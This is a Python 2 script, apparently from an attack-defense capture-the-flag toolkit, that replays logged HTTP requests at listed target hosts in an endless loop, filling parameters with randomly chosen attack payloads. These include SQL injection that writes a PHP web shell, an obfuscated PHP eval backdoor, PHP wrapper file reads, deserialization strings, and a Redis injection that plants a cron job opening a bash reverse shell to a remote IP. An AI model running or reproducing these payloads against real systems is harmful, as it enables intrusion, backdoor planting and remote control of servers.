#!/usr/bin/env python
# -*- coding: utf-8 -*-

from framework.http import http
from framework.config import *
import time
import os
import json
import threading
import sys,os
import hashlib
import httplib
import random
import base64
from urllib import quote
from urllib import unquote
from copy import deepcopy
import sys  
reload(sys)  
sys.setdefaultencoding('utf8')

ac_lang = ['en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3',
"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
"zh-CN,zh;q=0.8",
"zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,fr;q=0.2",
"en-US,en;q=0.5",
"zh-CN,zh;q=0.9",
"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
"zh-CN,zh;q=0.9,ja;q=0.8,en;q=0.7",
"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
"zh-CN,zh;q=0.8,en;q=0.6",
"zh-CN,zh;q=0.8"
]

def dir_flush(tmp_name):
    f=open("./trash_traffic/tmp/msg_result"+tmp_name,"wb")
    f.close()


def generate(file_ptr,hd,input,br,results_list=None):
    if not input:
        #file_ptr.write(hd+br)
        return 0
    for i in input:
        tmp=deepcopy(input)
        tmp[i][0]="{crasolee_para}"
        strs=""
        for i in tmp:
            strs+=i+"="+tmp[i][0]+"&"
        print strs.strip()
        content = strs.strip().encode('utf8')
        #results_list.append(hd+strs[:-1]+br)
        print hd+content+br
        file_ptr.write(hd+content+br)
    return 0

def load_proxy(file_path, tmp_name=''):
    f = open(file_path,"rb")
    rd = f.readlines()
    tmp_name = tmp_name.replace(':','_')
    fmsg = open("./trash_traffic/tmp/msg_result"+tmp_name,"ab")
    results=[]
    for i in rd:#[::-1]:
        pack = json.loads(i)
        if pack['method']=='GET':
            hd = "GET*---craso---*"+pack['path']+"*---craso---*"
            generate(fmsg,hd,pack['query'],"\r\n")
            #generate(fmsg,hd,pack['query'],"\r\n",results)
        elif pack['method']=='POST':
            hd = "POST*---craso---*"+pack['path']+"*---craso---*"
            generate(fmsg,hd,pack['content'],"\r\n")
            #generate(fmsg,hd,pack['content'],"\r\n",results)
    fmsg.close()
    f.close()
    return 0

def para_key():
    args = ['code','23333','eval','flag','password','deadbeef','system','pwd','pass',
            'shell','cmd']
    return args[random.randint(1,len(args)-1)]

def random_func():
    args = ['','code','23333','eval','flag','password','deadbeef','system','pwd','pass',
            'shell','cmd']
    action_str = ['cat','ls','rm','cp','gcc','cc','ssh','python','php','bash','/bin/sh',
                    'nc','nmap','scp','ld','make','netstat']
    argument_str = ['-c','-A','--privilege=true','-G','-O','-d','-la','-an','-SRlC',
                    '-T','-u']
    file_str = ['/home/flag','/etc/passwd','/var/www/html','index.php','flag.php',\
                'http://10.13.12.1','flag.log','download.php','upload.php',\
                'login.php','logout.php'
                ]

    result = ''
    for i in xrange(random.randint(1,2)):
        payload = []
        payload.append(args[random.randint(1,len(args)-1)]+'='+action_str[random.randint(1,len(action_str)-1)])
        for j in xrange(random.randint(1,6)):
            payload.append(argument_str[random.randint(0,len(argument_str)-1)])
        #print random.randint(0,len(argument_str))
        payload.append(file_str[random.randint(0,len(file_str)-1)])
        payload = ''.join(payload)
        result += payload+'&'
        
    tmp = result
    for m in xrange(10,30):
            tmp += chr(random.randint(32,127))
    #print tmp
    sss=['','base64,']
    tmp = sss[random.randint(0,1)]+base64.b64encode(tmp)
    return tmp


def simple_payload():

    tmp = ["25+union+select 1,2,3,4,0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e+into+outfile+'./shell1.php'",
    "zip://uploads/515969bfe90c2f52fbcd7e5818e8688b681eea4e.png#shell&a=system&b=ls",
    "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php",
    'O:3:"foo":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:5:"aaaa";}',
    "%0a&shell[]=php&shell[]=system&shell[]=ls",
    'O:3:"Foo":1:{s:4:"file";s:11:"_shell1.php";}',
    "誠' union select 1,0x706870636D73,0x3831346539303966363566316439313263646237636333393833623934333239,4,1,6,7 -- k"]
    tmp.append(unquote("%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2462%0d%0a%0a*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F327187384%2f12344%200%3E%261%0a%0d%0aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0d%0a:6379/"))
    tmp.append(unquote("kkk%89' and extractvalue(1, concat(0x7e, (select substr(authkey,1,30) FROM v9_sso_applications where appid=1),0x7e))–%20m"))
    tmp = tmp[random.randint(0,len(tmp)-1)]
    return tmp

def other_payload():
    tmp = ["@$_='s'.'s'./*-/*-*/'e'./*-/*-*/'r'; @$_=/*-/*-*/'a'./*-/*-*/$_./*-/*-*/'t'; @$_/*-/*-*/($/*-/*-*/{'_P'./*-/*-*/'OS'./*-/*-*/'T'} [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);",
    "zip://uploads/515969bfe90c2f52fbcd7e5818e8688b681eea4e.png#shell&a=system&b=ls"]
    sss=['','base64,']
    tmp = sss[random.randint(0,1)]+base64.b64encode(tmp[random.randint(0,len(tmp)-1)])
    return tmp

def trash():
    xx = random.randint(0,3)
    if xx==0:
        return random_func()
    elif xx==1:
        return simple_payload()
    elif xx==2:
        return other_payload()
    else:
        return random_func()


def send(hosts,msgs):
    #here are your targets
    #for i in xrange(0,5):
    while True:
        tmp_file=open("./data/ua.data","rb")
        rd=tmp_file.readlines()
        headers['User-Agent']=rd[random.randint(0,len(rd)-1)].strip()
        tmp_file.close()
        rnds = random.randint(0,6)
        if headers.has_key('Hacked by'):
            headers.pop('Hacked by')
        if rnds==0:
            headers['Hacked by']="Redbud"
        headers['Accept-Language']=ac_lang[random.randint(0,len(ac_lang)-1)]

        #print headers#['User-Agent']
        contents=msgs[random.randint(0,len(msgs)-1)].strip()
        if not contents:
            continue
        contents=contents.split("*---craso---*")
        if len(contents)<2:
            continue
        for host in hosts:
            ip,port = host[:-1].split(":")
            try:
                print contents[0]+" "+ip+":"+port+contents[1]+"?"+contents[2].format(crasolee_para=quote(trash()),crasolee_para0=para_key())
                tmp = http(contents[0],ip,int(port),contents[1]+"?"+contents[2].format(crasolee_para=quote(trash()),crasolee_para0=para_key()),contents[2].format(crasolee_para=quote(trash()),crasolee_para0=para_key()),headers)
            except Exception,e:
                print e
        time.sleep(1)

def attack(host_file="./data/ip.data", msg_file=traffic_msg_file):
    hosts = open(host_file).readlines()
    msgs = open(msg_file).readlines()
    send(hosts,msgs)

def init_msg_file():
    dirList=[i for i in os.listdir('./trash_traffic/logs/') if os.path.isdir(os.path.join('./trash_traffic/logs/',i))]
    for dir_name in dirList:
        dir_flush('_'+dir_name)
        files=[i for i in os.listdir('./trash_traffic/logs/'+dir_name) if os.path.isfile(os.path.join('./trash_traffic/logs/'+dir_name,i))]
        for file_path in files:
            load_proxy('./trash_traffic/logs/'+dir_name+'/'+file_path,'_'+dir_name)

if __name__ == '__main__': 
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", 
        "Accept-Encoding": "gzip, deflate", 
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive"
    }
    init_msg_file()
    
    for i in xrange(0,traffic_thread_num):
        print "start a new round of dirty"
        print 'thread %s is running...' % threading.current_thread().name
        t = threading.Thread(target=attack, name='LoopThread')
        t.setDaemon(True)
        t.start()
        print 'thread %s ended.' % threading.current_thread().name

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print '[!] killed by user'
        sys.exit()
